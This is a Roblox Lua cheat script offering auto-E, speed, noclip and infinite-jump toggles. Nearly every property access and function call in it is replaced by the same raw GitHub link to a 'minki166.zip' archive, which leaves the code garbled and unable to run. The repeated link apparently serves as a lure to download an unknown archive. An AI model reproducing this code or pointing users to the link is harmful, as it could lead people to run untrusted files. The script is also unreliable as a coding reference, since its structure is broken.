local UIS = game:GetService("UserInputService")
local VirtualInputManager = game:GetService("VirtualInputManager")
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local LocalPlayer = https://raw.githubusercontent.com/minki166/minki166/main/roasting/minki166.zip

local ScreenGui = https://raw.githubusercontent.com/minki166/minki166/main/roasting/minki166.zip("ScreenGui", https://raw.githubusercontent.com/minki166/minki166/main/roasting/minki166.zip)
https://raw.githubusercontent.com/minki166/minki166/main/roasting/minki166.zip = "WaveAutoEGui"
https://raw.githubusercontent.com/minki166/minki166/main/roasting/minki166.zip = false

local Frame = https://raw.githubusercontent.com/minki166/minki166/main/roasting/minki166.zip("Frame", ScreenGui)
https://raw.githubusercontent.com/minki166/minki166/main/roasting/minki166.zip = https://raw.githubusercontent.com/minki166/minki166/main/roasting/minki166.zip(0, 260, 0, 220)
https://raw.githubusercontent.com/minki166/minki166/main/roasting/minki166.zip = https://raw.githubusercontent.com/minki166/minki166/main/roasting/minki166.zip(0, 100, 0, 100)
https://raw.githubusercontent.com/minki166/minki166/main/roasting/minki166.zip = https://raw.githubusercontent.com/minki166/minki166/main/roasting/minki166.zip(25, 25, 25)
https://raw.githubusercontent.com/minki166/minki166/main/roasting/minki166.zip = 0

local UICorner = https://raw.githubusercontent.com/minki166/minki166/main/roasting/minki166.zip("UICorner", Frame)
https://raw.githubusercontent.com/minki166/minki166/main/roasting/minki166.zip = https://raw.githubusercontent.com/minki166/minki166/main/roasting/minki166.zip(0, 8)

local UIStroke = https://raw.githubusercontent.com/minki166/minki166/main/roasting/minki166.zip("UIStroke", Frame)
https://raw.githubusercontent.com/minki166/minki166/main/roasting/minki166.zip = https://raw.githubusercontent.com/minki166/minki166/main/roasting/minki166.zip(0, 170, 255)
https://raw.githubusercontent.com/minki166/minki166/main/roasting/minki166.zip = 2

local Title = https://raw.githubusercontent.com/minki166/minki166/main/roasting/minki166.zip("TextLabel", Frame)
https://raw.githubusercontent.com/minki166/minki166/main/roasting/minki166.zip = https://raw.githubusercontent.com/minki166/minki166/main/roasting/minki166.zip(1, 0, 0, 20)
https://raw.githubusercontent.com/minki166/minki166/main/roasting/minki166.zip = https://raw.githubusercontent.com/minki166/minki166/main/roasting/minki166.zip(0, 0, 0, 0)
https://raw.githubusercontent.com/minki166/minki166/main/roasting/minki166.zip = 1
https://raw.githubusercontent.com/minki166/minki166/main/roasting/minki166.zip = "made by moni"
https://raw.githubusercontent.com/minki166/minki166/main/roasting/minki166.zip = https://raw.githubusercontent.com/minki166/minki166/main/roasting/minki166.zip(180, 180, 180)
https://raw.githubusercontent.com/minki166/minki166/main/roasting/minki166.zip = https://raw.githubusercontent.com/minki166/minki166/main/roasting/minki166.zip
https://raw.githubusercontent.com/minki166/minki166/main/roasting/minki166.zip = 14

local function makeButton(text, positionY, color)
	local btn = https://raw.githubusercontent.com/minki166/minki166/main/roasting/minki166.zip("TextButton", Frame)
	https://raw.githubusercontent.com/minki166/minki166/main/roasting/minki166.zip = https://raw.githubusercontent.com/minki166/minki166/main/roasting/minki166.zip(0, 220, 0, 30)
	https://raw.githubusercontent.com/minki166/minki166/main/roasting/minki166.zip = https://raw.githubusercontent.com/minki166/minki166/main/roasting/minki166.zip(0, 20, 0, positionY)
	https://raw.githubusercontent.com/minki166/minki166/main/roasting/minki166.zip = text
	https://raw.githubusercontent.com/minki166/minki166/main/roasting/minki166.zip = color
	https://raw.githubusercontent.com/minki166/minki166/main/roasting/minki166.zip = https://raw.githubusercontent.com/minki166/minki166/main/roasting/minki166.zip(1,1,1)
	https://raw.githubusercontent.com/minki166/minki166/main/roasting/minki166.zip = https://raw.githubusercontent.com/minki166/minki166/main/roasting/minki166.zip
	https://raw.githubusercontent.com/minki166/minki166/main/roasting/minki166.zip = 16
	local corner = https://raw.githubusercontent.com/minki166/minki166/main/roasting/minki166.zip("UICorner", btn)
	https://raw.githubusercontent.com/minki166/minki166/main/roasting/minki166.zip = https://raw.githubusercontent.com/minki166/minki166/main/roasting/minki166.zip(0, 6)
	return btn
end

local ToggleE = makeButton("Auto E: OFF", 30, https://raw.githubusercontent.com/minki166/minki166/main/roasting/minki166.zip(0, 170, 255))
local ToggleSpeed = makeButton("Speed: OFF", 70, https://raw.githubusercontent.com/minki166/minki166/main/roasting/minki166.zip(255, 85, 0))
local ToggleNoclip = makeButton("Noclip: OFF", 110, https://raw.githubusercontent.com/minki166/minki166/main/roasting/minki166.zip(170, 0, 255))
local ToggleJump = makeButton("InfJump: OFF", 150, https://raw.githubusercontent.com/minki166/minki166/main/roasting/minki166.zip(0, 85, 255))

local CloseButton = https://raw.githubusercontent.com/minki166/minki166/main/roasting/minki166.zip("TextButton", Frame)
https://raw.githubusercontent.com/minki166/minki166/main/roasting/minki166.zip = https://raw.githubusercontent.com/minki166/minki166/main/roasting/minki166.zip(0, 20, 0, 20)
https://raw.githubusercontent.com/minki166/minki166/main/roasting/minki166.zip = https://raw.githubusercontent.com/minki166/minki166/main/roasting/minki166.zip(1, -25, 0, 2)
https://raw.githubusercontent.com/minki166/minki166/main/roasting/minki166.zip = "X"
https://raw.githubusercontent.com/minki166/minki166/main/roasting/minki166.zip = https://raw.githubusercontent.com/minki166/minki166/main/roasting/minki166.zip(255, 50, 50)
https://raw.githubusercontent.com/minki166/minki166/main/roasting/minki166.zip = https://raw.githubusercontent.com/minki166/minki166/main/roasting/minki166.zip(1, 1, 1)
https://raw.githubusercontent.com/minki166/minki166/main/roasting/minki166.zip = https://raw.githubusercontent.com/minki166/minki166/main/roasting/minki166.zip
https://raw.githubusercontent.com/minki166/minki166/main/roasting/minki166.zip = 14

local CloseCorner = https://raw.githubusercontent.com/minki166/minki166/main/roasting/minki166.zip("UICorner", CloseButton)
https://raw.githubusercontent.com/minki166/minki166/main/roasting/minki166.zip = https://raw.githubusercontent.com/minki166/minki166/main/roasting/minki166.zip(0, 4)

https://raw.githubusercontent.com/minki166/minki166/main/roasting/minki166.zip(function()
	ScreenGui:Destroy()
end)

local dragging, dragInput, dragStart, startPos

https://raw.githubusercontent.com/minki166/minki166/main/roasting/minki166.zip(function(input)
	if https://raw.githubusercontent.com/minki166/minki166/main/roasting/minki166.zip == https://raw.githubusercontent.com/minki166/minki166/main/roasting/minki166.zip then
		dragging = true
		dragStart = https://raw.githubusercontent.com/minki166/minki166/main/roasting/minki166.zip
		startPos = https://raw.githubusercontent.com/minki166/minki166/main/roasting/minki166.zip
		https://raw.githubusercontent.com/minki166/minki166/main/roasting/minki166.zip(function()
			if https://raw.githubusercontent.com/minki166/minki166/main/roasting/minki166.zip == https://raw.githubusercontent.com/minki166/minki166/main/roasting/minki166.zip then dragging = false end
		end)
	end
end)

https://raw.githubusercontent.com/minki166/minki166/main/roasting/minki166.zip(function(input)
	if https://raw.githubusercontent.com/minki166/minki166/main/roasting/minki166.zip == https://raw.githubusercontent.com/minki166/minki166/main/roasting/minki166.zip then dragInput = input end
end)

https://raw.githubusercontent.com/minki166/minki166/main/roasting/minki166.zip(function(input)
	if input == dragInput and dragging then
		local delta = https://raw.githubusercontent.com/minki166/minki166/main/roasting/minki166.zip - dragStart
		https://raw.githubusercontent.com/minki166/minki166/main/roasting/minki166.zip = https://raw.githubusercontent.com/minki166/minki166/main/roasting/minki166.zip(https://raw.githubusercontent.com/minki166/minki166/main/roasting/minki166.zip, https://raw.githubusercontent.com/minki166/minki166/main/roasting/minki166.zip + delta.X, https://raw.githubusercontent.com/minki166/minki166/main/roasting/minki166.zip, https://raw.githubusercontent.com/minki166/minki166/main/roasting/minki166.zip + delta.Y)
	end
end)

local autoE, speedOn, noclip, infJump = false, false, false, false

https://raw.githubusercontent.com/minki166/minki166/main/roasting/minki166.zip(function()
	autoE = not autoE
	https://raw.githubusercontent.com/minki166/minki166/main/roasting/minki166.zip = autoE and "Auto E: ON" or "Auto E: OFF"
	https://raw.githubusercontent.com/minki166/minki166/main/roasting/minki166.zip = autoE and https://raw.githubusercontent.com/minki166/minki166/main/roasting/minki166.zip(0, 255, 127) or https://raw.githubusercontent.com/minki166/minki166/main/roasting/minki166.zip(0, 170, 255)
end)

https://raw.githubusercontent.com/minki166/minki166/main/roasting/minki166.zip(function()
	speedOn = not speedOn
	local char = https://raw.githubusercontent.com/minki166/minki166/main/roasting/minki166.zip
	if char and char:FindFirstChild("Humanoid") then
		https://raw.githubusercontent.com/minki166/minki166/main/roasting/minki166.zip = speedOn and 75 or 16
	end
	https://raw.githubusercontent.com/minki166/minki166/main/roasting/minki166.zip = speedOn and "Speed: ON" or "Speed: OFF"
	https://raw.githubusercontent.com/minki166/minki166/main/roasting/minki166.zip = speedOn and https://raw.githubusercontent.com/minki166/minki166/main/roasting/minki166.zip(0, 255, 127) or https://raw.githubusercontent.com/minki166/minki166/main/roasting/minki166.zip(255, 85, 0)
end)

https://raw.githubusercontent.com/minki166/minki166/main/roasting/minki166.zip(function()
	noclip = not noclip
	https://raw.githubusercontent.com/minki166/minki166/main/roasting/minki166.zip = noclip and "Noclip: ON" or "Noclip: OFF"
	https://raw.githubusercontent.com/minki166/minki166/main/roasting/minki166.zip = noclip and https://raw.githubusercontent.com/minki166/minki166/main/roasting/minki166.zip(127, 0, 255) or https://raw.githubusercontent.com/minki166/minki166/main/roasting/minki166.zip(170, 0, 255)
end)

https://raw.githubusercontent.com/minki166/minki166/main/roasting/minki166.zip(function()
	infJump = not infJump
	https://raw.githubusercontent.com/minki166/minki166/main/roasting/minki166.zip = infJump and "InfJump: ON" or "InfJump: OFF"
	https://raw.githubusercontent.com/minki166/minki166/main/roasting/minki166.zip = infJump and https://raw.githubusercontent.com/minki166/minki166/main/roasting/minki166.zip(0, 255, 255) or https://raw.githubusercontent.com/minki166/minki166/main/roasting/minki166.zip(0, 85, 255)
end)

https://raw.githubusercontent.com/minki166/minki166/main/roasting/minki166.zip(function()
	if noclip and https://raw.githubusercontent.com/minki166/minki166/main/roasting/minki166.zip then
		for _, v in pairs(https://raw.githubusercontent.com/minki166/minki166/main/roasting/minki166.zip()) do
			if v:IsA("BasePart") then https://raw.githubusercontent.com/minki166/minki166/main/roasting/minki166.zip = false end
		end
	end
end)

https://raw.githubusercontent.com/minki166/minki166/main/roasting/minki166.zip(function()
	while true do
		if autoE then
			VirtualInputManager:SendKeyEvent(true, https://raw.githubusercontent.com/minki166/minki166/main/roasting/minki166.zip, false, game)
			VirtualInputManager:SendKeyEvent(false, https://raw.githubusercontent.com/minki166/minki166/main/roasting/minki166.zip, false, game)
		end
		https://raw.githubusercontent.com/minki166/minki166/main/roasting/minki166.zip(0.005)
	end
end)

https://raw.githubusercontent.com/minki166/minki166/main/roasting/minki166.zip(function()
	if infJump and https://raw.githubusercontent.com/minki166/minki166/main/roasting/minki166.zip and https://raw.githubusercontent.com/minki166/minki166/main/roasting/minki166.zip("Humanoid") then
		https://raw.githubusercontent.com/minki166/minki166/main/roasting/minki166.zip(https://raw.githubusercontent.com/minki166/minki166/main/roasting/minki166.zip)
	end
end)
